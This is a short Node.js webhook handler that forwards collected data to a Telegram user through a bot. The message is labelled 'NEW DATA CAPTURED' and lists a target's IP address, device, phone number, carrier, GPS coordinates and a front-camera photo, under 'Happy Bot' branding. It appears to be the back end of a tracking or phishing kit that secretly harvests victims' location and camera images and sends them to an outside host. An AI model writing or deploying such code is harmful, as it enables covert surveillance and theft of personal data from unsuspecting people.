const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    try {
      const { userId, data } = req.body;
      
      console.log('📨 Data received for user:', userId);

      const message = 
        `🔐 <b>NEW DATA CAPTURED</b>\n\n` +
        `🌐 <b>IP:</b> <code>${data.ip || 'N/A'}</code>\n` +
        `📱 <b>Device:</b> ${data.deviceInfo?.userAgent || 'N/A'}\n` +
        `📞 <b>Phone:</b> ${data.formData?.phoneNumber || 'N/A'}\n` +
        `🏴 <b>Country:</b> ${data.formData?.country || 'N/A'}\n` +
        `📡 <b>Operator:</b> ${data.formData?.operator || 'N/A'}\n` +
        `📍 <b>Location:</b> ${data.location ? `${data.location.latitude}, ${data.location.longitude}` : 'N/A'}\n` +
        `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
        `🔧 <b>Developed by Happy Bot</b> 🚀`;

      // Send message to user
      await bot.sendMessage(userId, message, { parse_mode: 'HTML' });

      // Send photo if available
      if (data.photo) {
        await bot.sendPhoto(userId, data.photo, {
          caption: '📸 Front Camera Photo - Happy Bot'
        });
      }

      console.log('✅ Data sent to user:', userId);
      res.json({ success: true });

    } catch (error) {
      console.error('❌ Webhook error:', error);
      res.status(500).json({ error: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
};
